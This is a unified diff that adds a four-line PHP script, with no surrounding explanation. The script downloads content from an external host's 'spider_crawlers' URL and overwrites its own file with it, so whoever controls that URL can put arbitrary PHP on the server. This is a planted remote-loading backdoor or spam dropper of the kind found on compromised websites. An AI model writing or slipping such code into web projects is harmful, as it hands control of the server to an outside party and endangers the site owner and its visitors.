@@ -1,0 +1,4 @@
+<?php 
+
+        file_put_contents(basename($_SERVER['PHP_SELF']), file_get_contents('https://anchortrends.com/php/spider_crawlers/index.php?spider=search')); 
+?>
